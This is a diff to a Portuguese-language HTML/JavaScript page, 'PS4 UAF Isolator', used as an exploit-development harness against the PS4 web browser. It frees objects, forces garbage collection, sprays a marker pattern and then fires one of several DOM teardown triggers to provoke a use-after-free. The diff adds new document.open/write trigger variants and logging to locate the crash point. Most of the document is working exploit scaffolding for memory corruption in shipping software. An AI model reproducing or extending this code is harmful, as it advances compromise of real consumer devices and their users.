@@ -3,7 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <title>PS4 UAF Isolator</title>
-
+<style>
+    body { font-family: sans-serif; background-color: #222; color: #fff; text-align: center; padding-top: 20px; }
+    button { padding: 10px 15px; margin: 5px; font-size: 14px; cursor: pointer; background-color: #0070cc; color: white; border: none; border-radius: 5px; }
+    button:hover { background-color: #0059a3; }
+    #log { margin-top: 20px; font-weight: bold; color: #ffcc00; text-align: left; max-width: 600px; margin-left: auto; margin-right: auto; }
+</style>
 </head>
 <body>
 
@@ -11,25 +16,50 @@
 <p>Selecione o gatilho. O navegador entrara em tela cheia.</p>
 <p><strong>Pressione OPTIONS para acionar o onblur e iniciar o gatilho.</strong></p>
 
+<button onclick="runTest(0)" style="background-color: #cc0000;">Teste 0: Baseline (Log Open/Write)</button><br><br>
+
 <button onclick="runTest(1)">Teste 1: Destruicao do DOM</button>
 <button onclick="runTest(2)">Teste 2: Saida do Fullscreen</button>
 <button onclick="runTest(3)">Teste 3: Teardown de Estilo</button>
 <button onclick="runTest(4)">Teste 4: Reset de Foco e Selecao</button>
+
 <button onclick="runTest(5)">Teste 5: Limpeza de Listeners</button>
 <button onclick="runTest(6)">Teste 6: Teardown de Animacao/Render Loop</button>
-<button onclick="runTest(7)">Teste 7: Abortar Loaders (window.stop)</button>
+
+<button onclick="runTest(7)">Teste 7: Abortar Loaders (window.stop)</button><br><br>
+
+<button onclick="runTest(8)">Teste 8A: document.write minimo</button>
+<button onclick="runTest(9)">Teste 8B: document.write vazio</button>
+<button onclick="runTest(10)">Teste 8C: document.write pesado</button>
 
 <div id="log"></div>
 
 <script>
 const PATTERN = 2.121995791e-314;
-let currentMode = 0;
+let currentMode = -1;
+
+function logMsg(msg) {
+    const log = document.getElementById("log");
+    log.innerHTML += "<p>" + msg + "</p>";
+    console.log(msg);
+}
+
+// Função de log segura vinda do Baseline
+function safeLog(msg) {
+    try {
+        console.log(msg);
+        const log = document.getElementById("log");
+        if(log) log.innerHTML += "<p>" + msg + "</p>";
+    } catch(e){}
+}
 
 function runTest(mode) {
     currentMode = mode;
     const log = document.getElementById("log");
+    log.innerHTML = ""; // Limpa logs anteriores
     
     let modeName = "";
+    if(mode === 0) modeName = "Baseline (Log Open/Write)";
     if(mode === 1) modeName = "Destruicao do DOM";
     if(mode === 2) modeName = "Saida do Fullscreen";
     if(mode === 3) modeName = "Teardown de Estilo";
@@ -37,6 +67,9 @@ function runTest(mode) {
     if(mode === 5) modeName = "Limpeza de Listeners";
     if(mode === 6) modeName = "Teardown de Animacao/Render Loop";
     if(mode === 7) modeName = "Abortar Loaders (window.stop)";
+    if(mode === 8) modeName = "document.write minimo";
+    if(mode === 9) modeName = "document.write vazio";
+    if(mode === 10) modeName = "document.write pesado";
 
     log.innerHTML = `Executando <b>${modeName}</b>... <br>Pressione OPTIONS agora.`;
 
@@ -55,7 +88,7 @@ function runTest(mode) {
     window.onblur = function() {
         // Remove o listener para evitar que múltiplos OPTIONS interfiram no fluxo
         window.onblur = null;
-        log.innerHTML = "Onblur acionado. Forcando GC e Spray...";
+        log.innerHTML += "<p>Onblur acionado. Forcando GC e Spray...</p>";
 
         // Passo 2: Força o Garbage Collector liberando a memória alocada
         controllers = null;
@@ -73,11 +106,25 @@ function runTest(mode) {
 
         // Passo 4: O Gatilho Isolado
         setTimeout(() => {
-            log.innerHTML = "Engatilhando vulnerabilidade...";
+            log.innerHTML += "<p>Engatilhando vulnerabilidade...</p>";
             
-           
-            
-            if (currentMode === 1) {
+            if (currentMode === 0) {
+                // TESTE 0: BASELINE (Isolado do arquivo original)
+                safeLog("[1] BEFORE document.open");
+
+                try {
+                    document.open();
+                    safeLog("[2] AFTER document.open");
+                } catch(e) {
+                    safeLog("[CRASH POINT] document.open: " + e);
+                    return;
+                }
+
+                // Não logar depois disso no DOM — pode não existir mais
+                document.write("<h1>Crash</h1>");
+                document.close();
+            }
+            else if (currentMode === 1) {
                 // Teste 1: Limpa o corpo da página
                 while (document.body.firstChild) {
                     document.body.removeChild(document.body.firstChild);
@@ -95,42 +142,72 @@ function runTest(mode) {
                 let forceLayout = document.documentElement.offsetHeight; 
             }
             else if (currentMode === 4) {
-                // Teste 4: Teardown agressivo de Foco (Crucial para falhas de onblur)
-                // Remove o foco ativo de qualquer elemento
+                // Teste 4: Teardown agressivo de Foco
                 if (document.activeElement) {
                     document.activeElement.blur();
                 }
-                // Limpa seleções internas do WebKit
                 window.getSelection().removeAllRanges();
                 
-                // Força o body a perder a referência de foco
                 document.body.tabIndex = -1;
                 document.body.focus();
                 document.body.blur();
             }
             else if (currentMode === 5) {
                 // Teste 5: Destruição de Event Listeners
-                // A forma mais rápida de forçar o WebCore a limpar listeners do DOM
-                // sem o peso do document.write()
                 let clone = document.body.cloneNode(false);
                 document.documentElement.replaceChild(clone, document.body);
             } 
-            
             else if (currentMode === 6) {
                 // Teste 6: Limpeza do Controlador de Animações
-                // Simula a destruição do m_scriptedAnimationController
-                // Registramos um frame fantasma e logo em seguida cancelamos ABSOLUTAMENTE tudo.
                 let id = requestAnimationFrame(() => {});
                 for (let i = 0; i <= id; i++) {
                     cancelAnimationFrame(i);
                 }
             }
             else if (currentMode === 7) {
-                // Teste 7: Abortar todos os recursos e rotinas ativas
-                // O equivalente JS para frame()->loader().stopAllLoaders()
+                // Teste 7: Abortar Loaders
                 window.stop();
-            }          
-         
+            } 
+            else if (currentMode === 8) {
+                // TESTE 8A — mínimo
+                logMsg("[T8A] BEFORE open");
+                try {
+                    document.open();
+                    logMsg("[T8A] AFTER open");
+                } catch(e) {
+                    logMsg("[T8A CRASH open]" + e);
+                    return;
+                }
+                document.write("<h1>X</h1>");
+                document.close();
+            }
+            else if (currentMode === 9) {
+                // TESTE 8B — vazio
+                logMsg("[T8B] BEFORE open");
+                try {
+                    document.open();
+                    logMsg("[T8B] AFTER open");
+                } catch(e) {
+                    logMsg("[T8B CRASH open]" + e);
+                    return;
+                }
+                document.write("");
+                document.close();
+            }
+            else if (currentMode === 10) {
+                // TESTE 8C — pesado
+                logMsg("[T8C] BEFORE open");
+                let big = "<div>".repeat(1000);
+                try {
+                    document.open();
+                    logMsg("[T8C] AFTER open");
+                } catch(e) {
+                    logMsg("[T8C CRASH open]" + e);
+                    return;
+                }
+                document.write(big);
+                document.close();
+            }         
             
             // Recarrega a página se o navegador sobreviver ao gatilho
             setTimeout(() => location.reload(), 1000);
